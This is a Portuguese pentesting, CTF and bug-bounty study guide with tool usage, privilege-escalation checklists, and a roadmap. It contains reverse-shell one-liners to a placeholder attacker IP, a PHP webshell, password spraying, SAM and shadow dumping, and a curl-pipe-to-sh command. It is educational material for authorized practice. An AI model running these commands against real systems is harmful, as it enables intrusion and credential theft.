# 🎯 Guia Completo — CTF, Bug Bounty e Pentest
**github.com/felipeds-cdc**

> ⚠️ Uso exclusivamente educacional e em ambientes autorizados — Lei 12.737/2012

---

## 📋 Índice

1. [O que falta para começar CTFs](#-1-o-que-falta-para-começar-ctfs)
2. [O que falta para começar Bug Bounty](#-2-o-que-falta-para-começar-bug-bounty)
3. [Seus recursos mapeados por fase do Pentest](#-3-seus-recursos-mapeados-por-fase-do-pentest)
4. [Ferramentas por categoria](#-4-ferramentas-por-categoria)
5. [Seus scripts mapeados](#-5-seus-scripts-mapeados)
6. [Plataformas recomendadas](#-6-plataformas-recomendadas)
7. [Roadmap de 90 dias](#-7-roadmap-de-90-dias)

---

## ✅ 1. O QUE FALTA PARA COMEÇAR CTFs

### Você JÁ TEM ✅
```
✅ Kali Linux instalado como sistema principal
✅ Python 3 com scripts próprios funcionais
✅ Conhecimento de Nmap, footprinting, reconhecimento
✅ Noções de redes (Cisco, TCP/IP, IPv4/IPv6)
✅ Fundamentos de Linux (comandos, permissões, processos)
✅ VirtualBox configurado
✅ Pendrive com ferramentas portáteis
✅ GitHub com portfólio crescente
✅ Certificações: Solyd, DESEC, Linux Foundation, Cisco, Fortinet, OPSWAT
```

### O que INSTALAR agora (gratuito) 🔧
```bash
# Ferramentas essenciais para CTF que podem estar faltando:
sudo apt install -y \
  gobuster dirb feroxbuster \    # dir busting
  john hashcat \                  # quebra de hash
  steghide stegseek exiftool \   # esteganografia
  binwalk file foremost \         # análise de arquivos
  gdb pwndbg \                   # exploração binária
  pwntools \                     # python para pwn
  netcat-traditional socat \     # shells reversas
  ffuf wfuzz \                   # fuzzing web
  enum4linux smbclient \         # enumeração SMB
  nikto \                        # scanner web
  python3-impacket \             # protocolo Windows
  curl wget jq                   # utilitários HTTP

# Burp Suite (proxy web — ESSENCIAL)
# Baixar Community Edition: https://portswigger.net/burp/communitydownload

# CyberChef (decodificador universal — ESSENCIAL para CTF)
# Usar online: https://gchq.github.io/CyberChef/
# Ou instalar local: npm install -g cyberchef

# Ghidra (engenharia reversa)
sudo apt install ghidra

# pwntools para Python
pip3 install pwntools --break-system-packages
```

### O que APRENDER antes do primeiro CTF 📚
```
🔲 Criar conta no TryHackMe e completar "Pre-Security"
🔲 Criar conta no PicoCTF e resolver 5 desafios General Skills
🔲 Entender encoding: Base64, ROT13, Hex, URL encoding
🔲 Saber usar Burp Suite para interceptar requisições HTTP
🔲 Praticar hash cracking com hashcat + rockyou.txt
🔲 Entender o que é um buffer overflow (conceito básico)
🔲 Ler 3 writeups de CTF resolvidos por outros antes de começar
```

### Mentalidade para CTF 🧠
```
✓ Comece pela categoria WEB — é a mais acessível
✓ Use Google e leia writeups — não é trapaça, é aprendizado
✓ Documente TUDO no seu GitHub (cada flag = writeup)
✓ Não gaste mais de 2 horas numa flag sem pedir dica
✓ Resolva no mínimo 3 categorias: Web, Crypto, Misc
✓ Prefira Jeopardy-style antes de Attack/Defense
```

---

## ✅ 2. O QUE FALTA PARA COMEÇAR BUG BOUNTY

### Pré-requisitos que você JÁ TEM ✅
```
✅ Reconhecimento automatizado (footprinting_tool.py + osint_collector.py)
✅ Varredura de portas (port_scanner.py + nmap_recon.sh)
✅ Enumeração web básica (web_scanner.py)
✅ Fundamentos de redes e HTTP
✅ Kali Linux com ferramentas instaladas
```

### O que APRENDER antes do primeiro relatório 📚
```
🔲 OWASP Top 10 — decorar os 10, entender exploração de cada
🔲 Como funciona HTTP: headers, cookies, sessions, CORS
🔲 SQL Injection manual (sem sqlmap primeiro)
🔲 XSS refletido e armazenado — payload básico e impacto
🔲 IDOR — Insecure Direct Object Reference
🔲 SSRF — Server Side Request Forgery
🔲 Como escrever um relatório de vulnerabilidade profissional
```

### O que MONTAR antes de caçar 🛠️
```bash
# Ambiente de Bug Bounty — instalar estas ferramentas:
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install github.com/tomnomnom/waybackurls@latest
go install github.com/hakluke/hakrawler@latest
go install github.com/ffuf/ffuf/v2@latest

# Instalar Go primeiro se necessário:
sudo apt install golang-go -y
```

### Plataformas para INICIAR (do mais fácil ao harder) 🎯
```
1. HackerOne — VDP programs (sem recompensa, perfeito para treinar)
   → hackerone.com/programs → filtrar "VDP"
   → Programas recomendados: US Dept of Defense, GitLab

2. Bugcrowd — programas públicos gratuitos
   → bugcrowd.com/programs

3. Hackaflag — plataforma BRASILEIRA com BB + CTF
   → hackaflag.com.br

4. Open Bug Bounty — foco em XSS e injeção
   → openbugbounty.org (sem precisar de convite)

5. Intigriti — europeu, excelente para iniciantes
   → intigriti.com
```

### Regras de ouro do Bug Bounty ⚖️
```
✓ SEMPRE leia o escopo completo antes de testar
✓ Nunca teste fora do escopo — é crime mesmo com boa intenção
✓ Prefira VDP programs no início (sem pressão de exclusividade)
✓ Documente TUDO com screenshot antes de reportar
✓ Não use ferramentas agressivas sem checar se é permitido
✓ Um relatório bem escrito vale mais que 10 mal escritos
✓ SSRF, IDOR e lógica de negócio pagam mais que XSS simples
```

---

## 🗺️ 3. SEUS RECURSOS MAPEADOS POR FASE DO PENTEST

```
╔══════════════════════════════════════════════════════════════════╗
║                    METODOLOGIA DE PENTEST                        ║
╠══════════════════╦═══════════════════╦════════════════════════╗  ║
║   FASE           ║  SEUS SCRIPTS     ║  SUAS FERRAMENTAS      ║  ║
╠══════════════════╬═══════════════════╬════════════════════════╣  ║
║ 1. Reconhecimento║ footprinting_     ║ Kali: whois, dig,      ║  ║
║    (Passivo)     ║   tool.py         ║ theHarvester,          ║  ║
║                  ║ osint_collector   ║ sublist3r              ║  ║
║                  ║   .py             ║ Pendrive: docs/        ║  ║
║                  ║                   ║   pentest-phases.md    ║  ║
╠══════════════════╬═══════════════════╬════════════════════════╣  ║
║ 2. Varredura     ║ port_scanner.py   ║ Kali: nmap, masscan,   ║  ║
║    (Scanning)    ║ nmap_recon.sh     ║ netdiscover            ║  ║
║                  ║ recon.py (RECON)  ║ Pendrive: nmap-port.  ║  ║
║                  ║                   ║ Ventoy: Kali ISO       ║  ║
╠══════════════════╬═══════════════════╬════════════════════════╣  ║
║ 3. Enumeração    ║ recon.py          ║ Kali: enum4linux,      ║  ║
║                  ║   --services      ║ smbclient, nikto,      ║  ║
║                  ║   --web           ║ gobuster, dirb         ║  ║
║                  ║   --dns           ║ ZTE: rede isolada      ║  ║
║                  ║   --fingerprint   ║ Metasploitable: alvo   ║  ║
╠══════════════════╬═══════════════════╬════════════════════════╣  ║
║ 4. Exploração    ║ xor_encryptor.c   ║ Kali: metasploit,      ║  ║
║                  ║ (base para payloads) sqlmap, burpsuite    ║  ║
║                  ║                   ║ DVWA: alvo web         ║  ║
║                  ║                   ║ Juice Shop: OWASP      ║  ║
╠══════════════════╬═══════════════════╬════════════════════════╣  ║
║ 5. Pós-          ║ hash_cracker.py   ║ Kali: linpeas,         ║  ║
║    Exploração    ║   (em dev)        ║ winpeas, john,         ║  ║
║                  ║ privesc_check.sh  ║ hashcat                ║  ║
║                  ║   (em dev)        ║ Pendrive: linpeas.sh   ║  ║
╠══════════════════╬═══════════════════╬════════════════════════╣  ║
║ 6. Relatório     ║ recon.py          ║ GitHub: templates      ║  ║
║                  ║   --format pdf    ║ Pendrive: /reports     ║  ║
║                  ║ RECON reporter    ║ Canva: currículo       ║  ║
╚══════════════════╩═══════════════════╩════════════════════════╝  ║
╚══════════════════════════════════════════════════════════════════╝
```

---

## 🔧 4. FERRAMENTAS POR CATEGORIA

---

### 🌐 WEB APPLICATION TESTING

#### Burp Suite Community
```bash
# Abrir
burpsuite &

# Configurar proxy no Firefox: 127.0.0.1:8080
# Ou instalar FoxyProxy extensão

# Funcionalidades essenciais:
# Proxy      → interceptar e modificar requests
# Repeater   → reenviar e testar payloads manualmente
# Intruder   → fuzz de parâmetros (lento na versão free)
# Decoder    → base64, URL encoding, hex
# Scanner    → detecta vulnerabilidades automático (pago)

# Dica CTF: use Repeater para testar SQLi manualmente
# Dica BB:  use Proxy para entender o fluxo da aplicação
```

#### Gobuster — Dir Busting
```bash
# Descoberta de diretórios
gobuster dir -u http://alvo.com -w /usr/share/wordlists/dirb/common.txt

# Com extensões
gobuster dir -u http://alvo.com \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,html,txt,js,json

# DNS brute force
gobuster dns -d alvo.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# VHost discovery
gobuster vhost -u http://alvo.com -w wordlist.txt

# Filtrar status codes
gobuster dir -u http://alvo.com -w wordlist.txt -s 200,301,302,403

# Aumentar threads (padrão=10)
gobuster dir -u http://alvo.com -w wordlist.txt -t 50
```

#### ffuf — Fuzzing Rápido
```bash
# Dir busting básico
ffuf -u http://alvo.com/FUZZ -w wordlist.txt

# Fuzzing de parâmetros GET
ffuf -u "http://alvo.com/page?id=FUZZ" -w wordlist.txt

# Fuzzing de subdomínios
ffuf -u http://FUZZ.alvo.com -w subdomains.txt -H "Host: FUZZ.alvo.com"

# Filtrar por tamanho de resposta (ignora 404s com mesmo tamanho)
ffuf -u http://alvo.com/FUZZ -w wordlist.txt -fs 1234

# Filtrar por status code
ffuf -u http://alvo.com/FUZZ -w wordlist.txt -mc 200,301,302

# Fuzzing de POST
ffuf -u http://alvo.com/login \
  -w passwords.txt \
  -X POST \
  -d "user=admin&pass=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Salvar resultado
ffuf -u http://alvo.com/FUZZ -w wordlist.txt -o resultado.json
```

#### SQLMap — SQL Injection Automático
```bash
# Teste básico
sqlmap -u "http://alvo.com/page?id=1"

# Com cookies (sessão autenticada)
sqlmap -u "http://alvo.com/page?id=1" --cookie="PHPSESSID=abc123"

# Via Burp request salvo
sqlmap -r request.txt

# Listar bancos de dados
sqlmap -u "http://alvo.com/page?id=1" --dbs

# Listar tabelas de um banco
sqlmap -u "http://alvo.com/page?id=1" -D dbname --tables

# Dumpar tabela de usuários
sqlmap -u "http://alvo.com/page?id=1" -D dbname -T users --dump

# Obter shell (se permitido pelo escopo)
sqlmap -u "http://alvo.com/page?id=1" --os-shell

# Contornar WAF
sqlmap -u "http://alvo.com/page?id=1" --tamper=space2comment,randomcase

# Verbose para debug
sqlmap -u "http://alvo.com/page?id=1" -v 3

# IMPORTANTE: não use --os-shell em Bug Bounty sem autorização explícita
```

#### Nikto — Scanner de Vulnerabilidades Web
```bash
# Scan básico
nikto -h http://alvo.com

# Com SSL
nikto -h https://alvo.com -ssl

# Porta específica
nikto -h http://alvo.com -p 8080

# Salvar resultado
nikto -h http://alvo.com -o resultado.txt

# Scan mais lento (evita IDS)
nikto -h http://alvo.com -Pause 1

# Verificar headers de segurança
nikto -h http://alvo.com -Tuning 9
```

---

### 🔐 QUEBRA DE HASH E SENHAS

#### Hashcat — GPU Hash Cracking
```bash
# Identificar tipo de hash
hashid hash_aqui
hash-identifier

# MD5 (modo 0)
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# SHA1 (modo 100)
hashcat -m 100 hash.txt rockyou.txt

# SHA256 (modo 1400)
hashcat -m 1400 hash.txt rockyou.txt

# NTLM Windows (modo 1000)
hashcat -m 1000 hash.txt rockyou.txt

# bcrypt (modo 3200) — muito lento
hashcat -m 3200 hash.txt rockyou.txt

# Com regras (mais poderoso que wordlist pura)
hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Ataque de máscara (brute force inteligente)
hashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l    # 6 letras minúsculas

# Ver progresso
hashcat -m 0 hash.txt rockyou.txt --status

# Mostrar senhas já quebradas
hashcat -m 0 hash.txt rockyou.txt --show

# Tipos de charset para máscara:
# ?l = minúsculas    ?u = maiúsculas
# ?d = dígitos       ?s = símbolos
# ?a = todos         ?h = hex baixo
```

#### John the Ripper
```bash
# Quebrar hash genérico
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Detectar formato automaticamente
john hash.txt --wordlist=rockyou.txt --format=auto

# Hash NTLM
john hash.txt --format=NT --wordlist=rockyou.txt

# Hash de /etc/shadow Linux
john shadow.txt --wordlist=rockyou.txt

# ZIP com senha
zip2john arquivo.zip > hash_zip.txt
john hash_zip.txt --wordlist=rockyou.txt

# PDF com senha
pdf2john arquivo.pdf > hash_pdf.txt
john hash_pdf.txt --wordlist=rockyou.txt

# SSH key protegida
ssh2john id_rsa > hash_ssh.txt
john hash_ssh.txt --wordlist=rockyou.txt

# Ver senhas quebradas
john hash.txt --show

# Retomar sessão interrompida
john --restore
```

---

### 🕵️ ESTEGANOGRAFIA (CTF)

#### Ferramentas de Estego
```bash
# Verificar tipo de arquivo
file imagem.jpg
exiftool imagem.jpg          # metadados completos
strings imagem.jpg           # strings de texto ocultas
xxd imagem.jpg | head -20    # bytes em hex

# steghide — ocultar/extrair em JPEG/BMP
steghide embed -cf foto.jpg -ef segredo.txt -p "senha"
steghide extract -sf foto.jpg -p "senha"
steghide info foto.jpg       # verificar se tem dados

# stegseek — força bruta em steghide (MUITO RÁPIDO)
stegseek imagem.jpg /usr/share/wordlists/rockyou.txt

# zsteg — PNG e BMP (LSB stego)
zsteg imagem.png             # análise automática
zsteg -a imagem.png          # todas as análises
zsteg -e b1,rgb,lsb imagem.png  # canal específico

# binwalk — arquivos embutidos
binwalk imagem.jpg           # detecta arquivos embutidos
binwalk -e imagem.jpg        # extrai automaticamente
binwalk --dd='.*' imagem.jpg # extrai tudo

# foremost — recuperação de arquivos
foremost -i arquivo.bin -o output/

# pngcheck — validação de PNG
pngcheck imagem.png

# Dica CTF: sempre rodar file + strings + exiftool primeiro
```

---

### 🔍 ENUMERAÇÃO DE SERVIÇOS

#### Enum4linux — SMB/Windows
```bash
# Enumeração completa
enum4linux -a 192.168.1.100

# Só usuários
enum4linux -U 192.168.1.100

# Só compartilhamentos
enum4linux -S 192.168.1.100

# Só grupos
enum4linux -G 192.168.1.100

# Com credenciais
enum4linux -u admin -p senha123 -a 192.168.1.100
```

#### SMBClient
```bash
# Listar compartilhamentos
smbclient -L //192.168.1.100 -N             # sem senha
smbclient -L //192.168.1.100 -U usuario

# Conectar em compartilhamento
smbclient //192.168.1.100/share -N
smbclient //192.168.1.100/share -U admin%senha

# Comandos dentro do smbclient:
# ls        → listar arquivos
# get arquivo → baixar arquivo
# put arquivo → enviar arquivo
# mget *    → baixar tudo

# Download recursivo
smbclient //192.168.1.100/share -N -c "recurse; mget *"
```

#### CrackMapExec (CME) — Swiss Knife Windows
```bash
# Verificar credenciais SMB
crackmapexec smb 192.168.1.100 -u admin -p senha123

# Spray de senha na rede
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt

# Executar comando (se admin)
crackmapexec smb 192.168.1.100 -u admin -p senha -x "whoami"

# Dump de hashes SAM
crackmapexec smb 192.168.1.100 -u admin -p senha --sam

# Listar compartilhamentos
crackmapexec smb 192.168.1.100 -u admin -p senha --shares
```

---

### ⬆️ ESCALADA DE PRIVILÉGIOS LINUX

#### LinPEAS — Automático
```bash
# Baixar e executar (em memória — sem escrita no disco)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Do pendrive (já tem o arquivo)
chmod +x /media/felipe/AL-8U-32/tools/linux/linpeas.sh
./linpeas.sh

# Salvar saída para análise posterior
./linpeas.sh | tee output_linpeas.txt

# Interpretar cores:
# Vermelho/Amarelo = 99% escalada possível
# Vermelho         = suspeito
# Verde            = configuração OK
```

#### Checklist Manual de PrivEsc Linux
```bash
# === INFORMAÇÕES BÁSICAS ===
whoami && id                          # quem sou
hostname                              # nome da máquina
uname -a                              # kernel + arquitetura
cat /etc/os-release                   # distribuição
cat /etc/passwd | grep -v nologin     # usuários com shell
cat /etc/shadow 2>/dev/null           # hashes (precisa root)
sudo -l                               # o que posso rodar como sudo

# === SUDO ===
sudo -l                               # verificar permissões sudo
# Se aparecer: (ALL) NOPASSWD: /usr/bin/vim
# Exploit: sudo vim -c ':!/bin/bash'

# === SUID/SGID ===
find / -perm -u=s -type f 2>/dev/null # binários SUID
find / -perm -g=s -type f 2>/dev/null # binários SGID
# Consultar: gtfobins.github.io (ouro para CTF e PrivEsc)

# === CAPABILITIES ===
getcap -r / 2>/dev/null               # binários com capabilities

# === CRON JOBS ===
crontab -l                            # cron do usuário atual
cat /etc/crontab                      # cron do sistema
ls -la /etc/cron*                     # todos os cron dirs
cat /var/spool/cron/crontabs/* 2>/dev/null

# === PROCESSOS ===
ps aux                                # todos os processos
ps aux | grep root                    # processos do root
# pspy64 — monitora processos sem root (do pendrive)
./pspy64

# === ARQUIVOS COM PERMISSÃO ESCRITA ===
find / -writable -type f 2>/dev/null | grep -v proc
find /etc -writable 2>/dev/null       # arquivos /etc editáveis

# === SENHAS EM ARQUIVOS ===
grep -r "password" /var/www/ 2>/dev/null
grep -r "passwd" /home/ 2>/dev/null
find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
cat ~/.bash_history                   # histórico de comandos
find / -name "id_rsa" 2>/dev/null     # chaves SSH privadas
find / -name "*.txt" 2>/dev/null | xargs grep -l "password" 2>/dev/null

# === PATH HIJACKING ===
echo $PATH
# Se /tmp ou pasta editável estiver no PATH antes de /usr/bin:
# Criar executável falso com nome de comando que o root usa

# === DOCKER / LXC ===
id | grep docker                      # usuário no grupo docker?
# Se sim: docker run -v /:/mnt --rm -it alpine chroot /mnt sh
ls -la /var/run/docker.sock           # socket do docker acessível?

# === NFS ===
cat /etc/exports                      # exports NFS
# Se no_root_squash: montar e criar SUID
showmount -e localhost

# === KERNEL EXPLOITS ===
uname -r                              # versão do kernel
# Verificar em: https://www.linux-exploit-suggester.com/
./linux-exploit-suggester.sh
```

#### GTFOBins — Referência de Binários
```bash
# Site: https://gtfobins.github.io
# Para cada binário SUID encontrado, consultar o site

# Exemplos comuns:

# vim com SUID ou sudo
sudo vim -c ':!/bin/bash'

# find com SUID
find . -exec /bin/sh \; -quit

# python com SUID ou sudo
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# bash com SUID
bash -p

# less/more com SUID
less /etc/passwd
# dentro do less: !bash

# nmap antigo com SUID
nmap --interactive
# dentro: !sh

# tar com sudo NOPASSWD
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# cat com capabilities cap_dac_read_search
cat /etc/shadow
```

---

### ⬆️ ESCALADA DE PRIVILÉGIOS WINDOWS

#### WinPEAS — Automático
```bash
# Transferir para a máquina alvo (do pendrive)
# Via Python HTTP server no Kali:
python3 -m http.server 8080

# Na máquina Windows:
certutil -urlcache -f http://SEU_IP:8080/winpeas.exe winpeas.exe
.\winpeas.exe

# Versão .bat (mais discreta)
.\winPEAS.bat
```

#### Checklist Manual Windows
```powershell
# === INFORMAÇÕES ===
whoami
whoami /priv                          # privilégios do token
whoami /groups                        # grupos do usuário
net user                              # lista usuários
net localgroup administrators         # membros do grupo admin
systeminfo                            # info completa do sistema
hostname

# === SERVIÇOS VULNERÁVEIS ===
sc query                              # listar serviços
wmic service list brief               # serviços resumido
# Verificar permissões nos binários dos serviços
icacls "C:\Program Files\servico\servico.exe"
# Se WU ou WD para usuários normais = substituir binário

# === SENHAS EM CLARO ===
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
dir /s /b *pass* *cred* *vnc* *.config* 2>nul
findstr /si password *.xml *.ini *.txt

# === APLICAÇÕES NÃO PATCHEADAS ===
wmic product get name,version         # programas instalados
wmic qfe list brief                   # patches instalados

# === UNQUOTED SERVICE PATHS ===
wmic service get name,pathname,displayname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'

# === CREDENCIAIS SALVAS ===
cmdkey /list                          # credenciais armazenadas
# Se houver: runas /savecred /user:admin cmd.exe

# === SAM / NTDS ===
# Se admin:
reg save hklm\sam sam.bak
reg save hklm\system system.bak
# Transferir e extrair hashes com impacket-secretsdump

# === POWERSHELL HISTORY ===
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

---

### 🐚 SHELLS REVERSAS E BIND SHELLS

#### One-Liners de Shell Reversa
```bash
# === OUVINTE NO KALI ===
nc -lvnp 4444
# Ou com rlwrap para histórico:
rlwrap nc -lvnp 4444

# === BASH ===
bash -i >& /dev/tcp/SEU_IP/4444 0>&1
# URL encoded (para injeção em URL):
bash+-i+>%26+/dev/tcp/SEU_IP/4444+0>%261

# === PYTHON 3 ===
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("SEU_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# === PHP ===
php -r '$sock=fsockopen("SEU_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Webshell PHP (upload em CTF/DVWA):
<?php system($_GET['cmd']); ?>
# Uso: http://alvo.com/shell.php?cmd=whoami

# === NETCAT ===
nc -e /bin/sh SEU_IP 4444         # nc com -e
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc SEU_IP 4444 >/tmp/f

# === PERL ===
perl -e 'use Socket;$i="SEU_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# === POWERSHELL ===
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("SEU_IP",4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+"PS "+(pwd).Path+">";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# === MELHORAR SHELL TTY ===
# Após obter shell não interativo, melhorar:
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z para background
stty raw -echo; fg
# Enter, Enter
export TERM=xterm
```

---

### 🔬 FORENSE DIGITAL (CAINE / CTF Forensics)

```bash
# === ANÁLISE DE ARQUIVOS ===
file arquivo                         # tipo do arquivo
xxd arquivo | head -20               # bytes em hex
strings arquivo | grep -i flag       # buscar flag em binário
binwalk -e arquivo                   # extrair arquivos embutidos
foremost -i arquivo -o output/       # recuperar arquivos deletados
exiftool imagem.jpg                  # metadados

# === ANÁLISE DE DISCO ===
fdisk -l /dev/sdb                    # partições
mount -o ro /dev/sdb1 /mnt/disco     # montar somente leitura
autopsy                              # GUI forense (como no CAINE)

# === ANÁLISE DE MEMÓRIA ===
# Com Volatility 3:
python3 vol.py -f memoria.dmp windows.info
python3 vol.py -f memoria.dmp windows.pslist      # processos
python3 vol.py -f memoria.dmp windows.hashdump    # hashes de senha
python3 vol.py -f memoria.dmp windows.cmdline     # comandos executados
python3 vol.py -f memoria.dmp windows.netscan     # conexões de rede

# === ANÁLISE DE REDE (.pcap) ===
wireshark captura.pcap               # análise visual
tshark -r captura.pcap               # linha de comando
tshark -r captura.pcap -Y "http"     # filtrar HTTP
tshark -r captura.pcap -Y "dns"      # filtrar DNS
# Buscar credenciais em tráfego HTTP:
tshark -r captura.pcap -Y "http.request.method==POST" -T fields -e http.file_data

# === HASHES DE ARQUIVOS ===
md5sum arquivo
sha256sum arquivo
# Verificar em: virustotal.com
```

---

### 🔓 CRIPTOGRAFIA (CTF Crypto)

```bash
# === ENCODING COMUM (não é criptografia) ===
# Base64
echo "texto" | base64
echo "dGV4dG8=" | base64 -d

# ROT13
echo "texto" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# Hex
echo "texto" | xxd -p
echo "74657874" | xxd -r -p

# URL decode
python3 -c "import urllib.parse; print(urllib.parse.unquote('%68%65%6c%6c%6f'))"

# === CYBERCHEF === (ferramenta mais usada em CTF crypto)
# Online: https://gchq.github.io/CyberChef/
# "Magic" operation detecta automaticamente o encoding

# === OPENSSL ===
# AES decrypt
openssl enc -aes-256-cbc -d -in arquivo.enc -out arquivo.dec -k "senha"
# RSA operations
openssl rsa -in chave.pem -text -noout    # info da chave
openssl rsautl -decrypt -inkey chave.pem -in arquivo.enc

# === RSA COM CHAVE FRACA (CTF) ===
# RsaCtfTool — ataque automático a RSA fraco
python3 RsaCtfTool.py --publickey pub.pem --uncipherfile arquivo.enc
# Instalar: git clone https://github.com/RsaCtfTool/RsaCtfTool

# === CIFRAS CLÁSSICAS ===
# Caesar/ROT — brute force:
for i in $(seq 1 25); do echo "$i: $(echo 'TEXTO' | tr 'A-Z' "$(printf '%s' {A..Z} | cut -c$((i+1))-26,1-$i | tr -d ' ')")"; done

# Vigenère — usar: https://www.dcode.fr/vigenere-cipher
```

---

## 🧰 5. SEUS SCRIPTS MAPEADOS

| Script | Fase | Uso em CTF | Uso em Bug Bounty |
|---|---|---|---|
| `footprinting_tool.py` | Reconhecimento | Analisar host do CTF | Mapear subdomínios e tecnologias |
| `nmap_recon.sh` | Varredura | Descobrir portas abertas rapidamente | Verificar superfície de ataque |
| `port_scanner.py` | Varredura | Scan rápido em Python puro | Alternativa ao Nmap |
| `osint_collector.py` | Reconhecimento | Analisar domínio do CTF | Coleta passiva de alvos |
| `xor_encryptor.c` | Pós-exploração | Desafios crypto XOR | N/A (bug bounty não usa) |
| `RECON tool` | Reconhecimento + Varredura | Pipeline completo | Coleta inicial automatizada |
| `web_scanner.py` | Enumeração | Dir busting básico | Descoberta de endpoints |

### Scripts que FALTAM criar para completar o arsenal
```
🔲 hash_cracker.py       → pós-exploração: quebrar hashes encontrados
🔲 privesc_check.sh      → pós-exploração: automatizar checklist Linux
🔲 sqli_tester.py        → exploração: testar payloads SQLi manualmente
🔲 reverse_shell_gen.py  → exploração: gerar one-liners automaticamente
🔲 ctf_decoder.py        → CTF utility: decodificar base64/hex/rot13/etc
🔲 bbhunter.sh           → bug bounty: pipeline de recon automático
```

---

## 🎯 6. PLATAFORMAS RECOMENDADAS

### Para CTF — Ordenadas por dificuldade

| Plataforma | URL | Nível | Gratuito |
|---|---|---|---|
| PicoCTF | picoctf.org | 🟢 Iniciante | ✅ Total |
| OverTheWire: Bandit | overthewire.org/wargames | 🟢 Iniciante | ✅ Total |
| TryHackMe | tryhackme.com | 🟢→🟡 Iniciante/Médio | ✅ Parcial |
| HackTheBox Starting Point | hackthebox.com | 🟡 Médio | ✅ Parcial |
| Root-Me | root-me.org | 🟡 Médio | ✅ Total |
| CTFtime | ctftime.org | 🔴 Todos | ✅ Total |
| pwn.college | pwn.college | 🔴 Avançado | ✅ Total |
| HackerSec CTF | hackersec.com | 🟡 Médio | Parcial |

### Para Bug Bounty — Ordenadas para iniciantes

| Plataforma | URL | Tipo | Dica |
|---|---|---|---|
| HackerOne VDP | hackerone.com | VDP (sem $) | Ideal para começar |
| Open Bug Bounty | openbugbounty.org | Público | Só XSS/SQLi |
| Hackaflag | hackaflag.com.br | BR + CTF | Único brasileiro |
| Bugcrowd | bugcrowd.com | Público + Privado | Bom suporte |
| Intigriti | intigriti.com | Público + Privado | Europa, bem organizado |
| YesWeHack | yeswehack.com | Público + Privado | Privacidade forte |

---

## 📅 7. ROADMAP DE 90 DIAS

### Mês 1 — Fundações CTF (Semanas 1-4)
```
Semana 1:
  ✅ Instalar ferramentas faltantes (Burp Suite, gobuster, hashcat)
  ✅ Criar conta PicoCTF + TryHackMe
  ✅ Resolver 10 desafios General Skills no PicoCTF
  ✅ Completar trilha "Pre-Security" no TryHackMe

Semana 2:
  ✅ TryHackMe: sala "OWASP Top 10"
  ✅ TryHackMe: sala "Burp Suite Basics"
  ✅ Primeiro writeup no GitHub (sala resolvida)
  ✅ Criar ctf-notes/reverse-shells.md no pendrive

Semana 3:
  ✅ TryHackMe: sala "Basic Pentesting"
  ✅ TryHackMe: sala "Mr Robot CTF"
  ✅ Configurar Metasploitable + DVWA no lab
  ✅ Testar SQLi manual no DVWA

Semana 4:
  ✅ Primeiro CTF real no PicoCTF (resolver 5 flags)
  ✅ Documentar cada flag como writeup no GitHub
  ✅ Criar conta HackTheBox
  ✅ Resolver primeira máquina "Starting Point" no HTB
```

### Mês 2 — CTF Sólido + Intro Bug Bounty (Semanas 5-8)
```
Semana 5-6:
  ✅ Resolver 3 máquinas HTB Starting Point
  ✅ Aprender OWASP Top 10 na prática (Juice Shop)
  ✅ Estudar IDOR + SSRF (vulnerabilidades que pagam bem)
  ✅ Criar conta HackerOne — só explorar programas VDP

Semana 7-8:
  ✅ Primeiro programa VDP no HackerOne (só recon + report)
  ✅ Criar script bbhunter.sh (recon automatizado)
  ✅ Escrever primeiro relatório de vulnerabilidade (mesmo que informativo)
  ✅ Publicar post LinkedIn sobre CTF + Bug Bounty
```

### Mês 3 — Bug Bounty Sério + Especialização (Semanas 9-12)
```
Semana 9-10:
  ✅ Participar de 1 CTF ao vivo (CTFtime.org)
  ✅ Testar 3 programas Bug Bounty públicos
  ✅ Primeiro relatório válido submetido (mesmo que N/A)
  ✅ Criar privesc_check.sh e hash_cracker.py

Semana 11-12:
  ✅ Escalada de privilégios no Metasploitable (documentar)
  ✅ Resolver 1 máquina HTB de nível Fácil sem writeup
  ✅ Atualizar README.md do GitHub com conquistas
  ✅ Publicar 2 writeups técnicos no LinkedIn
```

---

## ⚠️ Aviso Legal

```
Todo o conteúdo deste guia é para uso exclusivamente educacional.
Pratique apenas em:
